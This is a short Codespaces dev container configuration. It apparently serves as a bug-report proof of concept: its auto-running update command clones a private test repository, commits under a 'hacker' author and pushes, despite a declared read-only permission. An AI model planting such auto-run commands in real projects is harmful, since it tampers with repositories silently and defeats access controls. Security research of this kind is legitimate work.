{
  "updateContentCommand": "git clone https://github.com/ammaraskar-bug-test/private-repo-3 /tmp/private-repo && cd /tmp/private-repo && echo hi >> README.md && git commit -am test --author 'hacker <hacker@man.org>' && git push",
  "customizations": {
    "codespaces": {
      "repositories": {
        "ammaraskar-bug-test/private-repo": {
          "permissions": "read-all"
        }
      }
    }
  }
}
